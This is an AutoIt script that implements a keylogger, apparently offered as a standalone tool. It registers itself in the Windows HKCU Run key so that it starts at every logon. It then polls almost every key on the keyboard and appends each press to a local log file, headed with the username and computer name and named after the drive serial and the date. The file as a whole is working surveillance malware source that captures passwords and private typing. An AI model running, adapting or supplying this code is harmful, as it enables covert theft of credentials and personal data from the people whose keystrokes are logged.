#cs ----------------------------------------------------------------------------

 File:			stdklg.au3
 Author:		Sotiris Liagas
 Version:		1.0.0.1
 Language:		English (US)

#ce ----------------------------------------------------------------------------

#include <Misc.au3>
#include <string.au3>
#include <File.au3>
;#NoTrayIcon

RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Standard Keylogging Process", "REG_SZ", @ScriptFullPath)
FileCopy(@SystemDir & "\user32.dll", @ScriptDir & "\user32.dll")

Dim $Sep     = "######################################################################################################"
Dim $comment = "######################################################################################################"
Dim $dll = DllOpen (@ScriptDir & "\user32.dll")
Dim $name = DriveGetSerial(@HomeDrive)
Dim $file = @ScriptDir & "\[" & $name & "][" & @MDAY & "." & @MON & "." & @YEAR & "].log"
Dim $string
Dim $today

If @WDAY = 1 Then $today = "Sunday"
If @WDAY = 2 Then $today = "Monday"
If @WDAY = 3 Then $today = "Tuesday"
If @WDAY = 4 Then $today = "Wednesday"
If @WDAY = 5 Then $today = "Thursday"
If @WDAY = 6 Then $today = "Friday"
If @WDAY = 7 Then $today = "Saturday"

If FileExists(@ScriptDir & "\[" & $name & "][" & @MDAY & "." & @MON & "." & @YEAR & "].log") Then FileWrite($file,@CRLF & @CRLF)
FileWrite($file, $Sep & @CRLF & "######################################################################################################" & @CRLF & $comment & @CRLF & "USERNAME: " & @UserName & ", DOMAIN: " & @ComputerName & ", [Started at " & $today & " " & @MDAY & "/" & @MON & "/" & @YEAR & ", " & @HOUR & ":" & @MIN & ":" & @SEC & "]" & @CRLF & $Sep & @CRLF & @CRLF)

While 1
	If _IsPressed("23", $dll) Then
		$string = "{END}"

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("23", $dll)
    EndIf
	If _IsPressed("08", $dll) Then
		$string = "{BACKSPACE}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("08", $dll)
    EndIf
	If _IsPressed("09", $dll) Then
		$string = "{TAB}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("09", $dll)
    EndIf
	If _IsPressed("0C", $dll) Then
		$string = "{CLEAR}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("0C", $dll)
    EndIf
	If _IsPressed("0D", $dll) Then
		$string = "{ENTER}"

        FileWrite($file,$string & @CRLF)
				Do
		Until Not _IsPressed("0D", $dll)
    EndIf
	If _IsPressed("10", $dll) Then
		$string = "{SHIFT}"

        FileWrite($file,$string)
		_ReplaceStringInFile($file, "{SHIFT}{SHIFT}", "{SHIFT}")
    EndIf
	If _IsPressed("11", $dll) Then
		$string = "{CTRL}"

        FileWrite($file,$string)
		_ReplaceStringInFile($file, "{CTRL}{CTRL}", "{CTRL}")
    EndIf
	If _IsPressed("12", $dll) Then
		$string = "{ALT}"

        FileWrite($file,$string)
		_ReplaceStringInFile($file, "{ALT}{ALT}", "{ALT}")
    EndIf
	If _IsPressed("13", $dll) Then
		$string = "{PAUSE}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("13", $dll)
    EndIf
	If _IsPressed("14", $dll) Then
		$string = "{CAPS LOCK}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("14", $dll)
    EndIf
	If _IsPressed("1B", $dll) Then
		$string = "{ESC}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("1B", $dll)
    EndIf
	If _IsPressed("20", $dll) Then
		$string = " "

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("20", $dll)
    EndIf
	If _IsPressed("21", $dll) Then
		$string = "{PAGE UP}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("21", $dll)
    EndIf
	If _IsPressed("22", $dll) Then
		$string = "{PAGE DOWN}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("22", $dll)
    EndIf
	If _IsPressed("24", $dll) Then
		$string = "{HOME}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("24", $dll)
    EndIf
	If _IsPressed("25", $dll) Then
		$string = "{LEFT ARROW}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("25", $dll)
    EndIf
	If _IsPressed("26", $dll) Then
		$string = "{UP ARROW}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("26", $dll)
    EndIf
	If _IsPressed("27", $dll) Then
		$string = "{RIGHT ARROW}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("27", $dll)
    EndIf
	If _IsPressed("28", $dll) Then
		$string = "{DOWN ARROW}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("28", $dll)
    EndIf
	If _IsPressed("29", $dll) Then
		$string = "{SELECT}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("29", $dll)
    EndIf
	If _IsPressed("2A", $dll) Then
		$string = "{PRINT}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("2A", $dll)
    EndIf
	If _IsPressed("2B", $dll) Then
		$string = "{EXECUTE}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("2B", $dll)
    EndIf
	If _IsPressed("2C", $dll) Then
		$string = "{PRINT}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("2C", $dll)
    EndIf
	If _IsPressed("2D", $dll) Then
		$string = "{INS}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("2D", $dll)
    EndIf
	If _IsPressed("2E", $dll) Then
		$string = "{DEL}"

        FileWrite($file,$string)
		_ReplaceStringInFile($file, "{DEL}{DEL}", "{DEL}")
				Do
		Until Not _IsPressed("2E", $dll)
    EndIf
	If _IsPressed("30", $dll) Then
		$string = "0"

        FileWrite($file,$string)
		_ReplaceStringInFile($file, "{DEL}{DEL}", "{DEL}")
				Do
		Until Not _IsPressed("30", $dll)
    EndIf
	If _IsPressed("31", $dll) Then
		$string = "1"

        FileWrite($file,$string)
		_ReplaceStringInFile($file, "{DEL}{DEL}", "{DEL}")
				Do
		Until Not _IsPressed("31", $dll)
    EndIf
	If _IsPressed("32", $dll) Then
		$string = "2"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("32", $dll)
    EndIf
	If _IsPressed("33", $dll) Then
		$string = "3"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("33", $dll)
    EndIf
	If _IsPressed("34", $dll) Then
		$string = "4"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("34", $dll)
    EndIf
	If _IsPressed("35", $dll) Then
		$string = "5"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("35", $dll)
    EndIf
	If _IsPressed("36", $dll) Then
		$string = "6"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("36", $dll)
    EndIf
	If _IsPressed("37", $dll) Then
		$string = "7"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("37", $dll)
    EndIf
	If _IsPressed("38", $dll) Then
		$string = "8"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("38", $dll)
    EndIf
	If _IsPressed("39", $dll) Then
		$string = "9"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("39", $dll)
    EndIf
	If _IsPressed("41", $dll) Then
		$string = "a"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("41", $dll)
    EndIf
	If _IsPressed("42", $dll) Then
		$string = "b"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("42", $dll)
    EndIf
	If _IsPressed("43", $dll) Then
		$string = "c"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("43", $dll)
    EndIf
	If _IsPressed("44", $dll) Then
		$string = "d"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("44", $dll)
    EndIf
	If _IsPressed("45", $dll) Then
		$string = "e"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("45", $dll)
    EndIf
	If _IsPressed("46", $dll) Then
		$string = "f"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("46", $dll)
    EndIf
	If _IsPressed("47", $dll) Then
		$string = "g"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("47", $dll)
    EndIf
	If _IsPressed("48", $dll) Then
		$string = "h"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("48", $dll)
    EndIf
	If _IsPressed("49", $dll) Then
		$string = "i"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("49", $dll)
    EndIf
	If _IsPressed("4A", $dll) Then
		$string = "j"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("4A", $dll)
    EndIf
	If _IsPressed("4B", $dll) Then
		$string = "k"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("4B", $dll)
    EndIf
	If _IsPressed("4C", $dll) Then
		$string = "l"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("4C", $dll)
    EndIf
	If _IsPressed("4D", $dll) Then
		$string = "m"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("4D", $dll)
    EndIf
	If _IsPressed("4E", $dll) Then
		$string = "n"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("4E", $dll)
    EndIf
	If _IsPressed("4F", $dll) Then
		$string = "o"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("4F", $dll)
    EndIf
	If _IsPressed("50", $dll) Then
		$string = "p"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("50", $dll)
    EndIf
	If _IsPressed("51", $dll) Then
		$string = "q"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("51", $dll)
    EndIf
	If _IsPressed("52", $dll) Then
		$string = "r"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("52", $dll)
    EndIf
	If _IsPressed("53", $dll) Then
		$string = "s"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("53", $dll)
    EndIf
	If _IsPressed("54", $dll) Then
		$string = "t"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("54", $dll)
    EndIf
	If _IsPressed("55", $dll) Then
		$string = "u"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("55", $dll)
    EndIf
	If _IsPressed("56", $dll) Then
		$string = "v"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("56", $dll)
    EndIf
	If _IsPressed("57", $dll) Then
		$string = "w"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("57", $dll)
    EndIf
	If _IsPressed("58", $dll) Then
		$string = "x"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("58", $dll)
    EndIf
	If _IsPressed("59", $dll) Then
		$string = "y"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("59", $dll)
    EndIf
	If _IsPressed("5A", $dll) Then
		$string = "z"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("5A", $dll)
    EndIf
	If _IsPressed("5B", $dll) Then
		$string = "{LEFT WINDOWS KEY}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("5B", $dll)
    EndIf
	If _IsPressed("5C", $dll) Then
		$string = "{RIGHT WINDOWS KEY}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("5C", $dll)
    EndIf
	If _IsPressed("60", $dll) Then
		$string = "{NUM KEYPAD 0}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("60", $dll)
    EndIf
	If _IsPressed("61", $dll) Then
		$string = "{NUM KEYPAD 1}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("61", $dll)
    EndIf
	If _IsPressed("62", $dll) Then
		$string = "{NUM KEYPAD 2}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("62", $dll)
    EndIf
	If _IsPressed("63", $dll) Then
		$string = "{NUM KEYPAD 3}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("63", $dll)
    EndIf
	If _IsPressed("64", $dll) Then
		$string = "{NUM KEYPAD 4}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("64", $dll)
    EndIf
	If _IsPressed("65", $dll) Then
		$string = "{NUM KEYPAD 5}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("65", $dll)
    EndIf
	If _IsPressed("66", $dll) Then
		$string = "{NUM KEYPAD 6}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("66", $dll)
    EndIf
	If _IsPressed("67", $dll) Then
		$string = "{NUM KEYPAD 7}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("67", $dll)
    EndIf
	If _IsPressed("68", $dll) Then
		$string = "{NUM KEYPAD 8}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("68", $dll)
    EndIf
	If _IsPressed("69", $dll) Then
		$string = "{NUM KEYPAD 9}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("69", $dll)
    EndIf
	If _IsPressed("6A", $dll) Then
		$string = "{MULTIPLAY}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("6A", $dll)
    EndIf
	If _IsPressed("6B", $dll) Then
		$string = "{ADD}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("6B", $dll)
    EndIf
	If _IsPressed("6C", $dll) Then
		$string = "{SEPARATOR}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("6C", $dll)
    EndIf
	If _IsPressed("6D", $dll) Then
		$string = "{SUBTRACT}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("6D", $dll)
    EndIf
	If _IsPressed("6E", $dll) Then
		$string = "{DEMICAL}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("6E", $dll)
    EndIf
	If _IsPressed("6F", $dll) Then
		$string = "{DIVIDE}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("6F", $dll)
    EndIf
	If _IsPressed("70", $dll) Then
		$string = "{F1}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("70", $dll)
    EndIf
	If _IsPressed("71", $dll) Then
		$string = "{F2}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("71", $dll)
    EndIf
	If _IsPressed("73", $dll) Then
		$string = "{F4}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("73", $dll)
    EndIf
	If _IsPressed("72", $dll) Then
		$string = "{F3}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("72", $dll)
    EndIf
	If _IsPressed("74", $dll) Then
		$string = "{F5}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("74", $dll)
    EndIf
	If _IsPressed("75", $dll) Then
		$string = "{F6}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("75", $dll)
    EndIf
	If _IsPressed("76", $dll) Then
		$string = "{F7}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("76", $dll)
    EndIf
	If _IsPressed("77", $dll) Then
		$string = "{F8}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("77", $dll)
    EndIf
	If _IsPressed("78", $dll) Then
		$string = "{F9}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("78", $dll)
    EndIf
	If _IsPressed("79", $dll) Then
		$string = "{F10}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("79", $dll)
    EndIf
	If _IsPressed("7A", $dll) Then
		$string = "{F11}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("7A", $dll)
    EndIf
	If _IsPressed("7B", $dll) Then
		$string = "{F12}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("7B", $dll)
    EndIf
	If _IsPressed("7C", $dll) Then
		$string = "{F13}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("7C", $dll)
    EndIf
	If _IsPressed("7D", $dll) Then
		$string = "{F14}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("7D", $dll)
    EndIf
	If _IsPressed("7E", $dll) Then
		$string = "{F15}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("7E", $dll)
    EndIf
	If _IsPressed("7F", $dll) Then
		$string = "{F16}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("7F", $dll)
    EndIf
	If _IsPressed("90", $dll) Then
		$string = "{NUM LOCK}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("90", $dll)
    EndIf
	If _IsPressed("91", $dll) Then
		$string = "{SCROLL LOCK}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("91", $dll)
    EndIf
	If _IsPressed("BA", $dll) Then
		$string = ";"

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("BA", $dll)
    EndIf
	If _IsPressed("BB", $dll) Then
		$string = "="

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("BB", $dll)
    EndIf
	If _IsPressed("BC", $dll) Then
		$string = ","

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("BC", $dll)
    EndIf
	If _IsPressed("BD", $dll) Then
		$string = "-"

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("BD", $dll)
    EndIf
	If _IsPressed("BE", $dll) Then
		$string = "."

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("BE", $dll)
    EndIf
	If _IsPressed("BF", $dll) Then
		$string = "/"

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("BF", $dll)
    EndIf
	If _IsPressed("C0", $dll) Then
		$string = "`"

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("C0", $dll)
    EndIf
	If _IsPressed("DB", $dll) Then
		$string = "["

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("DB", $dll)
    EndIf
	If _IsPressed("DC", $dll) Then
		$string = "\"

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("DC", $dll)
    EndIf
	If _IsPressed("DD", $dll) Then
		$string = "]"

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("DD", $dll)
    EndIf
    _Memory()
WEnd

DllClose($dll)

Func _Memory()
   DllCall("psapi.dll", "int", "EmptyWorkingSet", "long", -1)
EndFunc
